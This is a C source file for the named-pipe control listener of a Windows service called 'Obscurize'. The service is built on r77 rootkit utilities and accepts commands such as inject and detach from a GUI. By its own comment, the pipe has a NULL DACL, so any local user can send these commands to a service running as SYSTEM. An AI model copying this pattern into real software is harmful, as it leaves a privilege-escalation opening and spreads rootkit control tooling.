#include "ControlPipeListener.h"
#include "../ObscurizeShared/ObscurizeDef.h"

// r77api CreatePublicNamedPipe utility
#include "../r77-rootkit/r77-rootkit-master/r77api/r77win.h"

// ============================================================
//  ObscurizeService – ControlPipeListener.c
//
//  Exposes the Obscurize control pipe.  Each connection
//  receives exactly one command DWORD; for the status query
//  the service writes a reply DWORD before disconnecting.
//
//  Security model:
//    - r77's CreatePublicNamedPipe sets a NULL DACL so any
//      user can connect.  This is intentional: the GUI runs
//      in a user session while the service runs as SYSTEM.
//    - Commands that have security implications (inject, detach,
//      mode switch) can optionally be locked down by checking
//      the client's token integrity level on the pipe handle
//      if stricter access control is required in future.
//
//  Thread lifecycle:
//    The listener thread is persistent and blocks on
//    ConnectNamedPipe.  A new pipe instance is created for
//    each connection so the protocol stays one-command-per-
//    connection – no length-prefixed framing needed.
// ============================================================

// --------------------------------------------------------
//  Server-side listener thread
// --------------------------------------------------------

typedef struct _CTRL_THREAD_PARAMS
{
    OBS_CTRL_CALLBACK Callback;
} CTRL_THREAD_PARAMS;

static DWORD WINAPI ControlPipeListenerThread(LPVOID param)
{
    OBS_CTRL_CALLBACK callback = ((CTRL_THREAD_PARAMS*)param)->Callback;
    HeapFree(GetProcessHeap(), 0, param);

    while (TRUE)
    {
        // Create a new pipe instance for this connection.
        HANDLE pipe = CreatePublicNamedPipe(OBS_CONTROL_PIPE_NAME);

        if (pipe == INVALID_HANDLE_VALUE)
        {
            Sleep(10);
            continue;
        }

        // Block until a client connects.
        if (ConnectNamedPipe(pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED)
        {
            // Read the 4-byte control code.
            DWORD controlCode = 0;
            DWORD bytesRead   = 0;
            if (ReadFile(pipe, &controlCode, sizeof(DWORD), &bytesRead, NULL)
                && bytesRead == sizeof(DWORD))
            {
                // Dispatch – the callback may write a reply to the pipe
                // (e.g. for OBS_CTRL_QUERY_STATUS) before returning.
                callback(controlCode, pipe);
            }
        }

        FlushFileBuffers(pipe);
        DisconnectNamedPipe(pipe);
        CloseHandle(pipe);
    }

    return 0;
}

// --------------------------------------------------------
//  Public API – server side
// --------------------------------------------------------

HANDLE StartControlPipeListener(OBS_CTRL_CALLBACK callback)
{
    CTRL_THREAD_PARAMS *params =
        (CTRL_THREAD_PARAMS*)HeapAlloc(GetProcessHeap(),
                                        HEAP_ZERO_MEMORY,
                                        sizeof(CTRL_THREAD_PARAMS));
    if (!params) return NULL;

    params->Callback = callback;
    HANDLE thread = CreateThread(NULL, 0, ControlPipeListenerThread, params, 0, NULL);
    if (!thread) HeapFree(GetProcessHeap(), 0, params);
    return thread;
}

// --------------------------------------------------------
//  Public API – client side (used by GUI)
// --------------------------------------------------------

BOOL SendControlCode(DWORD controlCode, LPDWORD statusOut)
{
    // Wait up to 2 seconds for the pipe to be available.
    if (!WaitNamedPipeW(OBS_CONTROL_PIPE_NAME, 2000)) return FALSE;

    HANDLE pipe = CreateFileW(
        OBS_CONTROL_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        0, NULL);

    if (pipe == INVALID_HANDLE_VALUE) return FALSE;

    // Switch to message-read mode (pipe was created in message mode).
    DWORD pipeMode = PIPE_READMODE_MESSAGE;
    SetNamedPipeHandleState(pipe, &pipeMode, NULL, NULL);

    BOOL  ok       = FALSE;
    DWORD written  = 0;

    if (WriteFile(pipe, &controlCode, sizeof(DWORD), &written, NULL)
        && written == sizeof(DWORD))
    {
        if (controlCode == OBS_CTRL_QUERY_STATUS && statusOut)
        {
            DWORD reply    = OBS_STATUS_ERROR;
            DWORD bytesRead = 0;
            if (ReadFile(pipe, &reply, sizeof(DWORD), &bytesRead, NULL)
                && bytesRead == sizeof(DWORD))
            {
                *statusOut = reply;
                ok = TRUE;
            }
        }
        else
        {
            ok = TRUE;
        }
    }

    CloseHandle(pipe);
    return ok;
}
